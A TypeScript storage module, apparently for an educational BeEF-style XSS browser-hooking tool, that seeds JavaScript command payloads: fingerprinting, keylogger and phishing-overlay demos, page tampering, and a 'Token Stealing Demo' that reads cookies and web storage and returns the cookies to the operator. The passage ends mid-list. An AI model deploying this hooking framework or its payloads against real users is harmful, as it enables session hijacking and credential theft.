import {
  users, type User, type InsertUser,
  hookedBrowsers, type HookedBrowser, type InsertHookedBrowser,
  commandModules, type CommandModule, type InsertCommandModule,
  commandExecutions, type CommandExecution, type InsertCommandExecution,
  logs, type Log, type InsertLog
} from "@shared/schema";

export interface IStorage {
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;

  // Hooked browser operations
  getHookedBrowser(id: number): Promise<HookedBrowser | undefined>;
  getHookedBrowserBySessionId(sessionId: string): Promise<HookedBrowser | undefined>;
  createHookedBrowser(browser: InsertHookedBrowser): Promise<HookedBrowser>;
  updateHookedBrowser(id: number, browser: Partial<HookedBrowser>): Promise<HookedBrowser | undefined>;
  listHookedBrowsers(): Promise<HookedBrowser[]>;
  deleteHookedBrowser(id: number): Promise<boolean>;
  
  // Command module operations
  getCommandModule(id: number): Promise<CommandModule | undefined>;
  createCommandModule(module: InsertCommandModule): Promise<CommandModule>;
  updateCommandModule(id: number, module: Partial<CommandModule>): Promise<CommandModule | undefined>;
  listCommandModules(): Promise<CommandModule[]>;
  listCommandModulesByCategory(category: string): Promise<CommandModule[]>;
  deleteCommandModule(id: number): Promise<boolean>;
  
  // Command execution operations
  getCommandExecution(id: number): Promise<CommandExecution | undefined>;
  createCommandExecution(execution: InsertCommandExecution): Promise<CommandExecution>;
  updateCommandExecution(id: number, execution: Partial<CommandExecution>): Promise<CommandExecution | undefined>;
  listCommandExecutions(): Promise<CommandExecution[]>;
  listCommandExecutionsByBrowser(browserId: number): Promise<CommandExecution[]>;
  
  // Log operations
  getLog(id: number): Promise<Log | undefined>;
  createLog(log: InsertLog): Promise<Log>;
  listLogs(): Promise<Log[]>;
  listLogsByBrowser(browserId: number): Promise<Log[]>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private hookedBrowsers: Map<number, HookedBrowser>;
  private commandModules: Map<number, CommandModule>;
  private commandExecutions: Map<number, CommandExecution>;
  private logs: Map<number, Log>;
  
  private userCurrentId: number;
  private browserCurrentId: number;
  private moduleCurrentId: number;
  private executionCurrentId: number;
  private logCurrentId: number;

  constructor() {
    this.users = new Map();
    this.hookedBrowsers = new Map();
    this.commandModules = new Map();
    this.commandExecutions = new Map();
    this.logs = new Map();
    
    this.userCurrentId = 1;
    this.browserCurrentId = 1;
    this.moduleCurrentId = 1;
    this.executionCurrentId = 1;
    this.logCurrentId = 1;
    
    // Initialize with default command modules
    this.initializeDefaultCommandModules();
  }

  // User operations
  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.userCurrentId++;
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  // Hooked browser operations
  async getHookedBrowser(id: number): Promise<HookedBrowser | undefined> {
    return this.hookedBrowsers.get(id);
  }

  async getHookedBrowserBySessionId(sessionId: string): Promise<HookedBrowser | undefined> {
    return Array.from(this.hookedBrowsers.values()).find(
      (browser) => browser.sessionId === sessionId,
    );
  }

  async createHookedBrowser(insertBrowser: InsertHookedBrowser): Promise<HookedBrowser> {
    const id = this.browserCurrentId++;
    const now = new Date();
    const browser: HookedBrowser = { 
      ...insertBrowser, 
      id, 
      firstSeen: now, 
      lastSeen: now 
    };
    this.hookedBrowsers.set(id, browser);
    
    // Create a log entry for the new browser
    await this.createLog({
      browserId: id,
      event: 'browser_hooked',
      details: { sessionId: browser.sessionId, ipAddress: browser.ipAddress },
      level: 'info'
    });
    
    return browser;
  }

  async updateHookedBrowser(id: number, browserUpdate: Partial<HookedBrowser>): Promise<HookedBrowser | undefined> {
    const browser = this.hookedBrowsers.get(id);
    if (!browser) return undefined;
    
    const updatedBrowser = { ...browser, ...browserUpdate };
    this.hookedBrowsers.set(id, updatedBrowser);
    return updatedBrowser;
  }

  async listHookedBrowsers(): Promise<HookedBrowser[]> {
    return Array.from(this.hookedBrowsers.values());
  }

  async deleteHookedBrowser(id: number): Promise<boolean> {
    return this.hookedBrowsers.delete(id);
  }

  // Command module operations
  async getCommandModule(id: number): Promise<CommandModule | undefined> {
    return this.commandModules.get(id);
  }

  async createCommandModule(insertModule: InsertCommandModule): Promise<CommandModule> {
    const id = this.moduleCurrentId++;
    const module: CommandModule = { ...insertModule, id };
    this.commandModules.set(id, module);
    return module;
  }

  async updateCommandModule(id: number, moduleUpdate: Partial<CommandModule>): Promise<CommandModule | undefined> {
    const module = this.commandModules.get(id);
    if (!module) return undefined;
    
    const updatedModule = { ...module, ...moduleUpdate };
    this.commandModules.set(id, updatedModule);
    return updatedModule;
  }

  async listCommandModules(): Promise<CommandModule[]> {
    return Array.from(this.commandModules.values());
  }

  async listCommandModulesByCategory(category: string): Promise<CommandModule[]> {
    return Array.from(this.commandModules.values()).filter(
      (module) => module.category === category,
    );
  }

  async deleteCommandModule(id: number): Promise<boolean> {
    return this.commandModules.delete(id);
  }

  // Command execution operations
  async getCommandExecution(id: number): Promise<CommandExecution | undefined> {
    return this.commandExecutions.get(id);
  }

  async createCommandExecution(insertExecution: InsertCommandExecution): Promise<CommandExecution> {
    const id = this.executionCurrentId++;
    const now = new Date();
    const execution: CommandExecution = { 
      ...insertExecution, 
      id, 
      executedAt: now
    };
    this.commandExecutions.set(id, execution);
    
    // Create a log entry for the command execution
    await this.createLog({
      browserId: execution.browserId,
      event: 'command_executed',
      details: { moduleId: execution.moduleId, status: execution.status },
      level: 'info'
    });
    
    return execution;
  }

  async updateCommandExecution(id: number, executionUpdate: Partial<CommandExecution>): Promise<CommandExecution | undefined> {
    const execution = this.commandExecutions.get(id);
    if (!execution) return undefined;
    
    const updatedExecution = { ...execution, ...executionUpdate };
    this.commandExecutions.set(id, updatedExecution);
    return updatedExecution;
  }

  async listCommandExecutions(): Promise<CommandExecution[]> {
    return Array.from(this.commandExecutions.values());
  }

  async listCommandExecutionsByBrowser(browserId: number): Promise<CommandExecution[]> {
    return Array.from(this.commandExecutions.values()).filter(
      (execution) => execution.browserId === browserId,
    );
  }

  // Log operations
  async getLog(id: number): Promise<Log | undefined> {
    return this.logs.get(id);
  }

  async createLog(insertLog: InsertLog): Promise<Log> {
    const id = this.logCurrentId++;
    const now = new Date();
    const log: Log = { 
      ...insertLog, 
      id, 
      timestamp: now
    };
    this.logs.set(id, log);
    return log;
  }

  async listLogs(): Promise<Log[]> {
    return Array.from(this.logs.values());
  }

  async listLogsByBrowser(browserId: number): Promise<Log[]> {
    return Array.from(this.logs.values()).filter(
      (log) => log.browserId === browserId,
    );
  }

  // Initialize default command modules
  private initializeDefaultCommandModules() {
    const defaultModules: InsertCommandModule[] = [
      {
        name: 'Get Browser Details',
        description: 'Retrieve detailed information about the hooked browser',
        category: 'Information Gathering',
        icon: 'info',
        code: `
          (() => {
            // Educational demonstration only
            const browserInfo = {
              userAgent: navigator.userAgent,
              platform: navigator.platform,
              language: navigator.language,
              cookiesEnabled: navigator.cookieEnabled,
              vendor: navigator.vendor,
              vendorSub: navigator.vendorSub,
              onLine: navigator.onLine,
              doNotTrack: navigator.doNotTrack,
              javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
              screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
              }
            };
            return browserInfo;
          })();
        `
      },
      {
        name: 'Get Installed Plugins',
        description: 'List all browser plugins and extensions',
        category: 'Information Gathering',
        icon: 'info',
        code: `
          (() => {
            // Educational demonstration only
            const plugins = [];
            if (navigator.plugins) {
              for(let i = 0; i < navigator.plugins.length; i++) {
                const plugin = navigator.plugins[i];
                plugins.push({
                  name: plugin.name,
                  description: plugin.description,
                  filename: plugin.filename
                });
              }
            }
            return { plugins };
          })();
        `
      },
      {
        name: 'Get System Information',
        description: 'Gather information about the system running the browser',
        category: 'Information Gathering',
        icon: 'info',
        code: `
          (() => {
            // Educational demonstration only
            return {
              platform: navigator.platform,
              userAgent: navigator.userAgent,
              screenResolution: {
                width: screen.width,
                height: screen.height
              },
              colorDepth: screen.colorDepth,
              devicePixelRatio: window.devicePixelRatio || 1,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              language: navigator.language,
              cores: navigator.hardwareConcurrency || 'unknown'
            };
          })();
        `
      },
      {
        name: 'Keystroke Logger (Educational)',
        description: 'Demonstrate how keystroke logging works in a controlled environment',
        category: 'Information Gathering',
        icon: 'keyboard',
        code: `
          (() => {
            // Educational demonstration only
            let keystrokes = [];
            let isLogging = false;
            
            // Create UI elements
            const loggerDiv = document.createElement('div');
            loggerDiv.id = 'xss-keylogger-demo';
            loggerDiv.style.position = 'fixed';
            loggerDiv.style.bottom = '20px';
            loggerDiv.style.right = '20px';
            loggerDiv.style.width = '300px';
            loggerDiv.style.padding = '15px';
            loggerDiv.style.backgroundColor = '#f8f9fa';
            loggerDiv.style.border = '1px solid #ddd';
            loggerDiv.style.borderRadius = '5px';
            loggerDiv.style.boxShadow = '0 0 10px rgba(0,0,0,0.1)';
            loggerDiv.style.zIndex = '9999';
            loggerDiv.style.fontFamily = 'Arial, sans-serif';
            
            loggerDiv.innerHTML = \`
              <div style="margin-bottom:10px; font-weight:bold; color:#721c24; background-color:#f8d7da; padding:5px; border-radius:3px; text-align:center;">
                EDUCATIONAL KEYSTROKE LOGGER DEMO
              </div>
              <div style="margin-bottom:10px;">
                <button id="start-logging" style="padding:5px 10px; background:#28a745; color:white; border:none; border-radius:3px; cursor:pointer; margin-right:5px;">Start Demo</button>
                <button id="stop-logging" style="padding:5px 10px; background:#dc3545; color:white; border:none; border-radius:3px; cursor:pointer; display:none;">Stop Demo</button>
              </div>
              <div style="font-size:12px; margin-bottom:10px;">Type in the field below to see keylogging in action:</div>
              <input type="text" id="demo-input" style="width:100%; padding:5px; margin-bottom:10px; border:1px solid #ced4da; border-radius:3px;" placeholder="Type here...">
              <div style="font-size:12px; margin-bottom:5px;">Captured keystrokes:</div>
              <div id="keystroke-log" style="height:100px; overflow-y:auto; border:1px solid #ced4da; padding:5px; font-family:monospace; font-size:12px; background:#f5f5f5;">
                Click "Start Demo" to begin...
              </div>
              <div style="font-size:11px; margin-top:10px; color:#6c757d;">For educational purposes only. In real-world attacks, this would happen invisibly.</div>
            \`;
            
            document.body.appendChild(loggerDiv);
            
            // Set up event handlers
            document.getElementById('start-logging').addEventListener('click', function() {
              document.getElementById('start-logging').style.display = 'none';
              document.getElementById('stop-logging').style.display = 'inline-block';
              document.getElementById('keystroke-log').innerHTML = 'Logging started...<br>';
              keystrokes = [];
              isLogging = true;
            });
            
            document.getElementById('stop-logging').addEventListener('click', function() {
              document.getElementById('stop-logging').style.display = 'none';
              document.getElementById('start-logging').style.display = 'inline-block';
              isLogging = false;
              document.getElementById('keystroke-log').innerHTML += '<br>Logging stopped.<br>';
            });
            
            // Set up the keylogger
            function handleKeyPress(e) {
              if (!isLogging) return;
              
              const key = e.key;
              const target = e.target.tagName;
              const timestamp = new Date().toLocaleTimeString();
              
              keystrokes.push({key, target, timestamp});
              
              let logElement = document.getElementById('keystroke-log');
              logElement.innerHTML += \`[\${timestamp}] \${key}<br>\`;
              logElement.scrollTop = logElement.scrollHeight;
            }
            
            // Only log keys from the demo input to be ethical
            document.getElementById('demo-input').addEventListener('keydown', handleKeyPress);
            
            return { success: true, message: 'Keystroke logger demonstration activated' };
          })();
        `
      },
      {
        name: 'Fake Login Phishing Demo',
        description: 'Demonstrate how phishing attacks can steal credentials',
        category: 'Social Engineering',
        icon: 'login',
        code: `
          (() => {
            // Educational demonstration only
            // Create a fake login overlay
            const overlay = document.createElement('div');
            overlay.id = 'xss-phishing-demo';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
            overlay.style.zIndex = '10000';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.fontFamily = 'Arial, sans-serif';
            
            const form = document.createElement('div');
            form.style.width = '350px';
            form.style.backgroundColor = 'white';
            form.style.borderRadius = '8px';
            form.style.padding = '20px';
            form.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
            
            form.innerHTML = \`
              <div style="text-align:center; margin-bottom:20px;">
                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Session Expired</div>
                <div style="font-size:14px; color:#666;">Please log in again to continue</div>
              </div>
              
              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
                <strong>EDUCATIONAL PHISHING DEMONSTRATION</strong><br>
                This is a simulated phishing attack for educational purposes only.
                <br>In a real attack, this warning would not be present.
              </div>
              
              <div style="margin-bottom:15px;">
                <label style="display:block; margin-bottom:5px; font-size:14px; font-weight:bold;">Email or Username</label>
                <input type="text" id="fake-username" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box;">
              </div>
              
              <div style="margin-bottom:20px;">
                <label style="display:block; margin-bottom:5px; font-size:14px; font-weight:bold;">Password</label>
                <input type="password" id="fake-password" style="width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; box-sizing:border-box;">
              </div>
              
              <button id="fake-submit" style="width:100%; padding:12px; background-color:#0066ff; color:white; border:none; border-radius:4px; font-size:16px; font-weight:bold; cursor:pointer;">Log In</button>
              
              <div style="margin-top:15px; font-size:13px; text-align:center;">
                <a href="#" style="color:#0066ff; text-decoration:none;">Forgot password?</a>
              </div>
              
              <div id="captured-creds" style="margin-top:20px; display:none; padding:10px; background-color:#e2f3e5; border:1px solid #d4edda; color:#155724; border-radius:4px; font-size:13px;">
              </div>
              
              <div style="margin-top:15px; text-align:right;">
                <button id="close-demo" style="padding:8px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer; font-size:13px;">Close Demo</button>
              </div>
            \`;
            
            overlay.appendChild(form);
            document.body.appendChild(overlay);
            
            // Set up event handlers
            document.getElementById('fake-submit').addEventListener('click', function() {
              const username = document.getElementById('fake-username').value;
              const password = document.getElementById('fake-password').value;
              
              if (username && password) {
                const capturedDiv = document.getElementById('captured-creds');
                capturedDiv.style.display = 'block';
                capturedDiv.innerHTML = \`
                  <strong>Credentials Captured! (Educational Demo Only)</strong><br>
                  Username: \${username}<br>
                  Password: \${password.replace(/./g, '*')}<br><br>
                  <div style="font-size:11px;">In a real attack, these credentials would be sent to the attacker.</div>
                \`;
                
                // Clear the form inputs
                document.getElementById('fake-username').value = '';
                document.getElementById('fake-password').value = '';
              }
            });
            
            document.getElementById('close-demo').addEventListener('click', function() {
              document.body.removeChild(overlay);
            });
            
            return { success: true, message: 'Fake login phishing demonstration activated' };
          })();
        `
      },
      {
        name: 'Create Alert Dialog',
        description: 'Display an alert dialog on the hooked browser',
        category: 'DOM Manipulation',
        icon: 'html',
        code: `
          (() => {
            // Educational demonstration only
            alert('This is an educational XSS demonstration');
            return { success: true, message: 'Alert displayed successfully' };
          })();
        `
      },
      {
        name: 'Replace Page Content',
        description: 'Replace the entire page content with a custom message',
        category: 'DOM Manipulation',
        icon: 'html',
        code: `
          (() => {
            // Educational demonstration only
            const originalContent = document.body.innerHTML;
            document.body.innerHTML = '<div style="padding: 20px; background-color: #f8d7da; color: #721c24; text-align: center; font-family: Arial; margin: 10px;">' +
              '<h2>Educational XSS Demonstration</h2>' +
              '<p>This page has been modified through an XSS vulnerability demonstration.</p>' +
              '<p>In a real attack, the attacker could steal your data or perform actions on your behalf.</p>' +
              '<button onclick="document.body.innerHTML = originalContent" style="padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Restore Original Content</button>' +
              '</div>';
            return { success: true, message: 'Page content replaced' };
          })();
        `
      },
      {
        name: 'Page Redirection Demo',
        description: 'Demonstrate page redirection attacks',
        category: 'DOM Manipulation',
        icon: 'link',
        code: `
          (() => {
            // Educational demonstration only
            const overlay = document.createElement('div');
            overlay.id = 'xss-redirect-demo';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
            overlay.style.zIndex = '10000';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.fontFamily = 'Arial, sans-serif';
            
            const dialog = document.createElement('div');
            dialog.style.width = '400px';
            dialog.style.backgroundColor = 'white';
            dialog.style.borderRadius = '8px';
            dialog.style.padding = '20px';
            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
            
            dialog.innerHTML = \`
              <div style="text-align:center; margin-bottom:20px;">
                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Page Redirection Attack Demo</div>
              </div>
              
              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
                This simulates how attackers can redirect users to malicious websites.
              </div>
              
              <div style="margin-bottom:20px;">
                <p style="font-size:14px; line-height:1.5;">
                  In a real attack, the page would be instantly redirected to a phishing site or malicious URL without warning. 
                  The redirection can happen using various methods:
                </p>
                <ul style="font-size:14px; margin-top:10px;">
                  <li style="margin-bottom:8px;">window.location.href = "malicious-url.com"</li>
                  <li style="margin-bottom:8px;">window.location.replace("malicious-url.com")</li>
                  <li style="margin-bottom:8px;">Meta refresh tag injection</li>
                </ul>
              </div>
              
              <div style="display:flex; justify-content:space-between; margin-top:20px;">
                <button id="simulate-redirect" style="padding:10px 15px; background-color:#0066ff; color:white; border:none; border-radius:4px; cursor:pointer;">Simulate Redirect</button>
                <button id="close-redirect-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
              </div>
            \`;
            
            overlay.appendChild(dialog);
            document.body.appendChild(overlay);
            
            // Set up event handlers
            document.getElementById('simulate-redirect').addEventListener('click', function() {
              const redirectDialog = document.createElement('div');
              redirectDialog.style.position = 'fixed';
              redirectDialog.style.top = '50%';
              redirectDialog.style.left = '50%';
              redirectDialog.style.transform = 'translate(-50%, -50%)';
              redirectDialog.style.backgroundColor = 'white';
              redirectDialog.style.padding = '20px';
              redirectDialog.style.borderRadius = '8px';
              redirectDialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
              redirectDialog.style.zIndex = '10001';
              redirectDialog.style.width = '300px';
              redirectDialog.style.textAlign = 'center';
              
              redirectDialog.innerHTML = \`
                <div style="font-size:18px; margin-bottom:10px;">Redirecting in 5 seconds...</div>
                <div style="font-size:14px; margin-bottom:15px;">This is only a simulation. No actual redirection will occur.</div>
                <div style="font-size:14px; font-weight:bold; color:#721c24;">In a real attack, you would be redirected to:</div>
                <div style="font-family:monospace; padding:8px; background:#f8f9fa; margin:10px 0; border-radius:4px;">https://malicious-phishing-site.com</div>
                <div id="redirect-countdown" style="font-size:20px; margin:15px 0;">5</div>
                <button id="cancel-redirect" style="padding:8px 15px; background-color:#dc3545; color:white; border:none; border-radius:4px; cursor:pointer;">Cancel</button>
              \`;
              
              document.body.appendChild(redirectDialog);
              
              let countdown = 5;
              const countdownEl = document.getElementById('redirect-countdown');
              
              const countdownInterval = setInterval(() => {
                countdown--;
                countdownEl.textContent = countdown;
                
                if (countdown <= 0) {
                  clearInterval(countdownInterval);
                  document.body.removeChild(redirectDialog);
                }
              }, 1000);
              
              document.getElementById('cancel-redirect').addEventListener('click', function() {
                clearInterval(countdownInterval);
                document.body.removeChild(redirectDialog);
              });
            });
            
            document.getElementById('close-redirect-demo').addEventListener('click', function() {
              document.body.removeChild(overlay);
            });
            
            return { success: true, message: 'Page redirection demonstration activated' };
          })();
        `
      },
      {
        name: 'Inject HTML Element',
        description: 'Inject a new HTML element into the page',
        category: 'DOM Manipulation',
        icon: 'html',
        code: `
          (() => {
            // Educational demonstration only
            const div = document.createElement('div');
            div.id = 'xss-demo-banner';
            div.style.position = 'fixed';
            div.style.top = '0';
            div.style.left = '0';
            div.style.width = '100%';
            div.style.padding = '10px';
            div.style.backgroundColor = '#cce5ff';
            div.style.color = '#004085';
            div.style.textAlign = 'center';
            div.style.zIndex = '9999';
            div.style.fontFamily = 'Arial, sans-serif';
            div.innerHTML = 'Educational XSS Demonstration - This banner was injected via a simulated XSS vulnerability';
            document.body.appendChild(div);
            return { success: true, element: 'div#xss-demo-banner' };
          })();
        `
      },
      {
        name: 'Iframe Injection Demo',
        description: 'Demonstrate iframe injection for UI redressing attacks',
        category: 'DOM Manipulation',
        icon: 'html',
        code: `
          (() => {
            // Educational demonstration only
            const overlay = document.createElement('div');
            overlay.id = 'xss-iframe-demo';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
            overlay.style.zIndex = '10000';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.fontFamily = 'Arial, sans-serif';
            
            const dialog = document.createElement('div');
            dialog.style.width = '500px';
            dialog.style.backgroundColor = 'white';
            dialog.style.borderRadius = '8px';
            dialog.style.padding = '20px';
            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
            
            dialog.innerHTML = \`
              <div style="text-align:center; margin-bottom:20px;">
                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Iframe Injection Attack Demo</div>
              </div>
              
              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
                This simulates how attackers can use iframes for clickjacking and UI redressing attacks.
              </div>
              
              <div style="margin-bottom:20px;">
                <p style="font-size:14px; line-height:1.5;">
                  In a real attack, iframes can be used to:
                </p>
                <ul style="font-size:14px; margin-top:10px;">
                  <li style="margin-bottom:8px;">Load malicious content within a legitimate site</li>
                  <li style="margin-bottom:8px;">Create clickjacking attacks where transparent elements trick users into clicking hidden buttons</li>
                  <li style="margin-bottom:8px;">Bypass same-origin policy restrictions</li>
                </ul>
              </div>
              
              <div style="margin-bottom:20px;">
                <p style="font-size:14px; font-weight:bold;">Demo iframe (showing example.com):</p>
                <div id="iframe-container" style="position:relative; width:100%; height:200px; border:1px solid #ddd; overflow:hidden; margin-top:10px;">
                  <div style="position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.6); display:flex; justify-content:center; align-items:center; z-index:2; pointer-events:none;">
                    <div style="padding:10px; background:rgba(0,0,0,0.7); color:white; border-radius:4px;">
                      Iframe content (typically hidden or disguised)
                    </div>
                  </div>
                  <iframe src="about:blank" id="demo-iframe" style="width:100%; height:100%; border:none;"></iframe>
                </div>
              </div>
              
              <div style="margin-top:20px; display:flex; justify-content:flex-end;">
                <button id="close-iframe-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
              </div>
            \`;
            
            overlay.appendChild(dialog);
            document.body.appendChild(overlay);
            
            // Set iframe content
            const iframe = document.getElementById('demo-iframe');
            if (iframe && iframe.contentWindow) {
              iframe.contentWindow.document.open();
              iframe.contentWindow.document.write(\`
                <html>
                <head>
                  <style>
                    body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                    .button { display: inline-block; padding: 10px 20px; background: #0066ff; color: white; 
                             border-radius: 4px; text-decoration: none; margin-top: 20px; }
                  </style>
                </head>
                <body>
                  <h2>Demo Content</h2>
                  <p>In a real attack, this could be a clone of a login page or another sensitive site.</p>
                  <a href="#" class="button">Malicious Button</a>
                </body>
                </html>
              \`);
              iframe.contentWindow.document.close();
            }
            
            // Set up event handlers
            document.getElementById('close-iframe-demo').addEventListener('click', function() {
              document.body.removeChild(overlay);
            });
            
            return { success: true, message: 'Iframe injection demonstration activated' };
          })();
        `
      },
      {
        name: 'Token Stealing Demo',
        description: 'Educational demonstration of how session tokens can be stolen',
        category: 'Information Gathering',
        icon: 'security',
        code: `
          (() => {
            // Educational demonstration only
            const overlay = document.createElement('div');
            overlay.id = 'xss-token-demo';
            overlay.style.position = 'fixed';
            overlay.style.top = '0';
            overlay.style.left = '0';
            overlay.style.width = '100%';
            overlay.style.height = '100%';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
            overlay.style.zIndex = '10000';
            overlay.style.display = 'flex';
            overlay.style.justifyContent = 'center';
            overlay.style.alignItems = 'center';
            overlay.style.fontFamily = 'Arial, sans-serif';
            
            const dialog = document.createElement('div');
            dialog.style.width = '500px';
            dialog.style.backgroundColor = 'white';
            dialog.style.borderRadius = '8px';
            dialog.style.padding = '20px';
            dialog.style.boxShadow = '0 10px 25px rgba(0,0,0,0.2)';
            
            // Get cookies and local storage data
            const cookieData = document.cookie;
            const localStorageItems = {};
            for (let i = 0; i < localStorage.length; i++) {
              const key = localStorage.key(i);
              if (key) {
                localStorageItems[key] = localStorage.getItem(key);
              }
            }
            
            // Get session storage data
            const sessionStorageItems = {};
            for (let i = 0; i < sessionStorage.length; i++) {
              const key = sessionStorage.key(i);
              if (key) {
                sessionStorageItems[key] = sessionStorage.getItem(key);
              }
            }
            
            dialog.innerHTML = \`
              <div style="text-align:center; margin-bottom:20px;">
                <div style="font-size:22px; font-weight:bold; margin-bottom:5px;">Token Stealing Demonstration</div>
              </div>
              
              <div style="margin-bottom:15px; background-color:#f8d7da; border:1px solid #f5c6cb; color:#721c24; padding:10px; border-radius:4px; font-size:12px; text-align:center;">
                <strong>EDUCATIONAL DEMONSTRATION ONLY</strong><br>
                This simulates how attackers can steal authentication tokens and session data.
              </div>
              
              <div style="margin-bottom:20px;">
                <p style="font-size:14px; line-height:1.5;">
                  In a real attack, the following data would be sent to the attacker's server:
                </p>
                
                <div style="margin-top:15px;">
                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">Cookies:</div>
                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
                    \${cookieData ? cookieData : "No cookies found"}
                  </div>
                </div>
                
                <div style="margin-top:15px;">
                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">localStorage:</div>
                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
                    \${Object.keys(localStorageItems).length > 0 ? JSON.stringify(localStorageItems, null, 2) : "No localStorage data found"}
                  </div>
                </div>
                
                <div style="margin-top:15px;">
                  <div style="font-weight:bold; margin-bottom:5px; font-size:14px;">sessionStorage:</div>
                  <div style="background:#f8f9fa; padding:10px; border-radius:4px; font-family:monospace; font-size:12px; overflow-x:auto; max-height:80px; overflow-y:auto;">
                    \${Object.keys(sessionStorageItems).length > 0 ? JSON.stringify(sessionStorageItems, null, 2) : "No sessionStorage data found"}
                  </div>
                </div>
              </div>
              
              <div style="margin-top:20px; font-size:14px; background-color:#e2e3e5; border:1px solid #d6d8db; color:#383d41; padding:10px; border-radius:4px;">
                <strong>Security Note:</strong> To protect against XSS token theft, use HttpOnly cookies, implement proper CSP headers, and consider using anti-CSRF tokens.
              </div>
              
              <div style="margin-top:20px; display:flex; justify-content:flex-end;">
                <button id="close-token-demo" style="padding:10px 15px; background-color:#f8f9fa; border:1px solid #ddd; border-radius:4px; cursor:pointer;">Close Demo</button>
              </div>
            \`;
            
            overlay.appendChild(dialog);
            document.body.appendChild(overlay);
            
            // Set up event handlers
            document.getElementById('close-token-demo').addEventListener('click', function() {
              document.body.removeChild(overlay);
            });
            
            return { 
              success: true, 
              message: 'Token stealing demonstration activated',
              cookies: cookieData,
              localStorage: Object.keys(localStorageItems),
              sessionStorage: Object.keys(sessionStorageItems)
            };
          })();
        `
      },
      {
        name: 'Ping Host',
        description: 'Perform a basic ping test to check connectivity',
        category: 'Network Detection',
        icon: 'wifi',
        code: `
          (() => {
            // Educational demonstration only
            const pingHost = (host) => {
              return new Promise((resolve) => {
                const img = new Image();
                const start = new Date().getTime();
                let resolved = false;
                
                const timeout = setTimeout(() => {
                  if (!resolved) {
                    resolved = true;
                    resolve({ host, status: 'timeout', time: 5000 });
                  }
                }, 5000);
                
                img.onload = () => {
                  if (!resolved) {
                    resolved = true;
                    clearTimeout(timeout);
                    resolve({ host, status: 'online', time: new Date().getTime() - start });
                  }
                };
                
                img.onerror = () => {
                  if (!resolved) {
                    resolved = true;
                    clearTimeout(timeout);
                    resolve({ host, status: 'online', time: new Date().getTime() - start });
                  }
                };
                
                img.src = 'https://' + host + '/favicon.ico?_=' + start;
              });
            };
            
            return {
              message: 'This is a simulation. In a real scenario, this would check host connectivity.',
              note: 'For educational purposes only.'
            };
          })();
        `
      },
      {
        name: 'Check Same-Origin',
        description: 'Detect if resources are from the same origin',
        category: 'Network Detection',
        icon: 'wifi',
        code: `
          (() => {
            // Educational demonstration only
            const links = document.getElementsByTagName('a');
            const resources = [];
            
            for (let i = 0; i < links.length; i++) {
              const link = links[i];
              try {
                const url = new URL(link.href);
                resources.push({
                  href: link.href,
                  host: url.host,
                  sameOrigin: url.origin === window.location.origin
                });
              } catch (e) {
                // Skip invalid URLs
              }
            }
            
            return { resources, currentOrigin: window.location.origin };
          })();
        `
      },
      {
        name: 'Get Network Interfaces',
